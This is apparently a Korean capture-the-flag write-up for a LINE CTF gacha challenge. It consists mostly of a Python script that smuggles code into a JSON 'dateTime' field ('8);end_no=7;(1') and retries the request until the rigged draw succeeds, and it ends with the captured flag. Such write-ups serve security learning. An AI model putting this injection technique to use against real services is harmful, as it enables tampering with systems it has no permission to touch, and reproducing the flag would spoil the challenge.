
# 후기
- 가챠 문제를 풀랬더니 진짜 가챠를 돌렸던 전설의 문제
- 회장님이 풀었는데 이거 익스했을 때 표정이 도박에서 돈 딴사람 표정이었음

# 코드
```python
import requests as rq
import json
from threading import Thread
import time

url = 'http://34.85.97.250:11008'

headers = {
    "Content-Type": "application/json",
}

def func1():
    data = {
        "userName":"AAAAAAAAAAA",
        "userNumbers":[7,7,7],
        "dateTime":"8);end_no=7;(1"
    }

    res = rq.post(url + '/api/gotcha', json=data)

    a = json.loads(res.text)
    for i in a:
        print(f'{i} : {a[i]}')

    uuid = a["result"]["uuid"]

    res = rq.get(url + '/api/gotcha/' + uuid)

    b = json.loads(res.text)

    for i in b:
        print(f'{i} : {b[i]}')

    if(b["imageUrl"] != "gotchafail.jpg"):
        with open('abc', 'w') as f:
            f.write(b["imageUrl"])
        return True

    else:
        return False

for i in range(1000):
    a= func1()
    if(a):
        break
```

LINECTF{1c817e624ca6e4875e1a876aaf3466fc}